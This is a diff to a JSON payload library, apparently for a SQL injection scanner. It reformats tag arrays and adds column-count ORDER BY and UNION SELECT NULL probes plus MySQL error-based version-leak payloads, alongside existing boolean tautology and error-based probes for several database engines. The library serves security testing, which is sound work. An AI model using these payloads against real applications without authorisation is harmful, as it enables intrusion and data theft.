@@ -12,7 +12,10 @@
       "context": "string",
       "mode": "detection",
       "template": "'",
-      "tags": ["detection", "error"],
+      "tags": [
+        "detection",
+        "error"
+      ],
       "notes": "A lone quote often triggers a SQL syntax error in string contexts."
     },
     {
@@ -23,7 +26,10 @@
       "context": "string",
       "mode": "detection",
       "template": "\"",
-      "tags": ["detection", "error"]
+      "tags": [
+        "detection",
+        "error"
+      ]
     },
     {
       "id": "sqli-generic-detect-backslash",
@@ -33,7 +39,9 @@
       "context": "string",
       "mode": "detection",
       "template": "\\",
-      "tags": ["detection"]
+      "tags": [
+        "detection"
+      ]
     },
     {
       "id": "sqli-generic-bool-true-string",
@@ -43,7 +51,9 @@
       "context": "string",
       "mode": "boolean",
       "template": "' OR '1'='1",
-      "tags": ["boolean"]
+      "tags": [
+        "boolean"
+      ]
     },
     {
       "id": "sqli-generic-bool-false-string",
@@ -53,7 +63,9 @@
       "context": "string",
       "mode": "boolean",
       "template": "' AND '1'='2",
-      "tags": ["boolean"],
+      "tags": [
+        "boolean"
+      ],
       "notes": "Pair with the true probe; differing responses suggest injection."
     },
     {
@@ -64,7 +76,10 @@
       "context": "string",
       "mode": "boolean",
       "template": "' OR 1=1-- -",
-      "tags": ["boolean", "comment"]
+      "tags": [
+        "boolean",
+        "comment"
+      ]
     },
     {
       "id": "sqli-generic-bool-true-numeric",
@@ -74,7 +89,9 @@
       "context": "numeric",
       "mode": "boolean",
       "template": "1 OR 1=1",
-      "tags": ["boolean"]
+      "tags": [
+        "boolean"
+      ]
     },
     {
       "id": "sqli-generic-bool-false-numeric",
@@ -84,7 +101,9 @@
       "context": "numeric",
       "mode": "boolean",
       "template": "1 AND 1=2",
-      "tags": ["boolean"]
+      "tags": [
+        "boolean"
+      ]
     },
     {
       "id": "sqli-generic-bool-comment-numeric",
@@ -94,7 +113,10 @@
       "context": "numeric",
       "mode": "boolean",
       "template": "1 OR 1=1-- -",
-      "tags": ["boolean", "comment"]
+      "tags": [
+        "boolean",
+        "comment"
+      ]
     },
     {
       "id": "sqli-generic-search-bool",
@@ -104,7 +126,10 @@
       "context": "search",
       "mode": "boolean",
       "template": "%' OR '1'='1",
-      "tags": ["boolean", "search"]
+      "tags": [
+        "boolean",
+        "search"
+      ]
     },
     {
       "id": "sqli-generic-order-1",
@@ -114,7 +139,10 @@
       "context": "numeric",
       "mode": "union",
       "template": "1 ORDER BY 1-- -",
-      "tags": ["union", "enumeration"],
+      "tags": [
+        "union",
+        "enumeration"
+      ],
       "notes": "Increment the column number until the query errors to count columns."
     },
     {
@@ -125,9 +153,11 @@
       "context": "string",
       "mode": "union",
       "template": "' ORDER BY 1-- -",
-      "tags": ["union", "enumeration"]
+      "tags": [
+        "union",
+        "enumeration"
+      ]
     },
-
     {
       "id": "sqli-mysql-error-extractvalue",
       "name": "MySQL extractvalue error",
@@ -136,7 +166,10 @@
       "context": "string",
       "mode": "error",
       "template": "' AND extractvalue(1,concat(0x7e,version()))-- -",
-      "tags": ["error", "version"],
+      "tags": [
+        "error",
+        "version"
+      ],
       "notes": "Non-destructive error-based version disclosure on MySQL >= 5.1."
     },
     {
@@ -147,7 +180,10 @@
       "context": "string",
       "mode": "boolean",
       "template": "' OR 1=1#",
-      "tags": ["boolean", "comment"]
+      "tags": [
+        "boolean",
+        "comment"
+      ]
     },
     {
       "id": "sqli-postgres-error-cast",
@@ -157,7 +193,10 @@
       "context": "string",
       "mode": "error",
       "template": "' AND 1=cast(version() as int)-- -",
-      "tags": ["error", "version"],
+      "tags": [
+        "error",
+        "version"
+      ],
       "notes": "Type-cast error reveals version() on PostgreSQL."
     },
     {
@@ -168,7 +207,10 @@
       "context": "string",
       "mode": "error",
       "template": "' AND 1=convert(int,@@version)-- -",
-      "tags": ["error", "version"],
+      "tags": [
+        "error",
+        "version"
+      ],
       "notes": "Conversion error discloses @@version on Microsoft SQL Server."
     },
     {
@@ -179,8 +221,291 @@
       "context": "string",
       "mode": "error",
       "template": "' AND 1=sqlite_version()-- -",
-      "tags": ["error", "version"],
+      "tags": [
+        "error",
+        "version"
+      ],
       "notes": "Comparison with sqlite_version() can surface behavioural differences."
+    },
+    {
+      "id": "sqli-union-string-orderby2",
+      "name": "sqli-union-string-orderby2",
+      "category": "sqli",
+      "engine": "generic",
+      "mode": "union",
+      "context": "string",
+      "template": "' ORDER BY 2-- -",
+      "required": [],
+      "tags": [
+        "union"
+      ],
+      "notes": "Column-count probe: errors when fewer than 2 columns."
+    },
+    {
+      "id": "sqli-union-string-orderby3",
+      "name": "sqli-union-string-orderby3",
+      "category": "sqli",
+      "engine": "generic",
+      "mode": "union",
+      "context": "string",
+      "template": "' ORDER BY 3-- -",
+      "required": [],
+      "tags": [
+        "union"
+      ],
+      "notes": "Column-count probe: errors when fewer than 3 columns."
+    },
+    {
+      "id": "sqli-union-string-orderby4",
+      "name": "sqli-union-string-orderby4",
+      "category": "sqli",
+      "engine": "generic",
+      "mode": "union",
+      "context": "string",
+      "template": "' ORDER BY 4-- -",
+      "required": [],
+      "tags": [
+        "union"
+      ],
+      "notes": "Column-count probe: errors when fewer than 4 columns."
+    },
+    {
+      "id": "sqli-union-string-orderby5",
+      "name": "sqli-union-string-orderby5",
+      "category": "sqli",
+      "engine": "generic",
+      "mode": "union",
+      "context": "string",
+      "template": "' ORDER BY 5-- -",
+      "required": [],
+      "tags": [
+        "union"
+      ],
+      "notes": "Column-count probe: errors when fewer than 5 columns."
+    },
+    {
+      "id": "sqli-union-string-null1",
+      "name": "sqli-union-string-null1",
+      "category": "sqli",
+      "engine": "generic",
+      "mode": "union",
+      "context": "string",
+      "template": "' UNION SELECT NULL-- -",
+      "required": [],
+      "tags": [
+        "union"
+      ],
+      "notes": "UNION with 1 column(s); succeeds when the query has 1 columns."
+    },
+    {
+      "id": "sqli-union-string-null2",
+      "name": "sqli-union-string-null2",
+      "category": "sqli",
+      "engine": "generic",
+      "mode": "union",
+      "context": "string",
+      "template": "' UNION SELECT NULL,NULL-- -",
+      "required": [],
+      "tags": [
+        "union"
+      ],
+      "notes": "UNION with 2 column(s); succeeds when the query has 2 columns."
+    },
+    {
+      "id": "sqli-union-string-null3",
+      "name": "sqli-union-string-null3",
+      "category": "sqli",
+      "engine": "generic",
+      "mode": "union",
+      "context": "string",
+      "template": "' UNION SELECT NULL,NULL,NULL-- -",
+      "required": [],
+      "tags": [
+        "union"
+      ],
+      "notes": "UNION with 3 column(s); succeeds when the query has 3 columns."
+    },
+    {
+      "id": "sqli-union-string-null4",
+      "name": "sqli-union-string-null4",
+      "category": "sqli",
+      "engine": "generic",
+      "mode": "union",
+      "context": "string",
+      "template": "' UNION SELECT NULL,NULL,NULL,NULL-- -",
+      "required": [],
+      "tags": [
+        "union"
+      ],
+      "notes": "UNION with 4 column(s); succeeds when the query has 4 columns."
+    },
+    {
+      "id": "sqli-union-string-null5",
+      "name": "sqli-union-string-null5",
+      "category": "sqli",
+      "engine": "generic",
+      "mode": "union",
+      "context": "string",
+      "template": "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
+      "required": [],
+      "tags": [
+        "union"
+      ],
+      "notes": "UNION with 5 column(s); succeeds when the query has 5 columns."
+    },
+    {
+      "id": "sqli-union-numeric-orderby2",
+      "name": "sqli-union-numeric-orderby2",
+      "category": "sqli",
+      "engine": "generic",
+      "mode": "union",
+      "context": "numeric",
+      "template": "1 ORDER BY 2-- -",
+      "required": [],
+      "tags": [
+        "union"
+      ],
+      "notes": "Column-count probe (numeric): errors below 2 columns."
+    },
+    {
+      "id": "sqli-union-numeric-orderby3",
+      "name": "sqli-union-numeric-orderby3",
+      "category": "sqli",
+      "engine": "generic",
+      "mode": "union",
+      "context": "numeric",
+      "template": "1 ORDER BY 3-- -",
+      "required": [],
+      "tags": [
+        "union"
+      ],
+      "notes": "Column-count probe (numeric): errors below 3 columns."
+    },
+    {
+      "id": "sqli-union-numeric-orderby4",
+      "name": "sqli-union-numeric-orderby4",
+      "category": "sqli",
+      "engine": "generic",
+      "mode": "union",
+      "context": "numeric",
+      "template": "1 ORDER BY 4-- -",
+      "required": [],
+      "tags": [
+        "union"
+      ],
+      "notes": "Column-count probe (numeric): errors below 4 columns."
+    },
+    {
+      "id": "sqli-union-numeric-orderby5",
+      "name": "sqli-union-numeric-orderby5",
+      "category": "sqli",
+      "engine": "generic",
+      "mode": "union",
+      "context": "numeric",
+      "template": "1 ORDER BY 5-- -",
+      "required": [],
+      "tags": [
+        "union"
+      ],
+      "notes": "Column-count probe (numeric): errors below 5 columns."
+    },
+    {
+      "id": "sqli-union-numeric-null1",
+      "name": "sqli-union-numeric-null1",
+      "category": "sqli",
+      "engine": "generic",
+      "mode": "union",
+      "context": "numeric",
+      "template": "1 UNION SELECT NULL-- -",
+      "required": [],
+      "tags": [
+        "union"
+      ],
+      "notes": "UNION with 1 column(s), numeric context."
+    },
+    {
+      "id": "sqli-union-numeric-null2",
+      "name": "sqli-union-numeric-null2",
+      "category": "sqli",
+      "engine": "generic",
+      "mode": "union",
+      "context": "numeric",
+      "template": "1 UNION SELECT NULL,NULL-- -",
+      "required": [],
+      "tags": [
+        "union"
+      ],
+      "notes": "UNION with 2 column(s), numeric context."
+    },
+    {
+      "id": "sqli-union-numeric-null3",
+      "name": "sqli-union-numeric-null3",
+      "category": "sqli",
+      "engine": "generic",
+      "mode": "union",
+      "context": "numeric",
+      "template": "1 UNION SELECT NULL,NULL,NULL-- -",
+      "required": [],
+      "tags": [
+        "union"
+      ],
+      "notes": "UNION with 3 column(s), numeric context."
+    },
+    {
+      "id": "sqli-union-numeric-null4",
+      "name": "sqli-union-numeric-null4",
+      "category": "sqli",
+      "engine": "generic",
+      "mode": "union",
+      "context": "numeric",
+      "template": "1 UNION SELECT NULL,NULL,NULL,NULL-- -",
+      "required": [],
+      "tags": [
+        "union"
+      ],
+      "notes": "UNION with 4 column(s), numeric context."
+    },
+    {
+      "id": "sqli-union-numeric-null5",
+      "name": "sqli-union-numeric-null5",
+      "category": "sqli",
+      "engine": "generic",
+      "mode": "union",
+      "context": "numeric",
+      "template": "1 UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
+      "required": [],
+      "tags": [
+        "union"
+      ],
+      "notes": "UNION with 5 column(s), numeric context."
+    },
+    {
+      "id": "sqli-mysql-error-updatexml",
+      "name": "sqli-mysql-error-updatexml",
+      "category": "sqli",
+      "engine": "mysql",
+      "mode": "error",
+      "context": "string",
+      "template": "' AND updatexml(1,concat(0x7e,version()),1)-- -",
+      "required": [],
+      "tags": [
+        "error"
+      ],
+      "notes": "MySQL updatexml error-based leak (alternative to extractvalue)."
+    },
+    {
+      "id": "sqli-mysql-error-double",
+      "name": "sqli-mysql-error-double",
+      "category": "sqli",
+      "engine": "mysql",
+      "mode": "error",
+      "context": "string",
+      "template": "' AND (SELECT 1 FROM(SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+      "required": [],
+      "tags": [
+        "error"
+      ],
+      "notes": "MySQL double-query (floor/rand) error-based leak."
     },
     {
       "id": "sqli-mysql-bool-numeric",
@@ -190,7 +515,9 @@
       "context": "numeric",
       "mode": "boolean",
       "template": "1 OR 1=1#",
-      "tags": ["boolean"]
+      "tags": [
+        "boolean"
+      ]
     }
   ]
 }
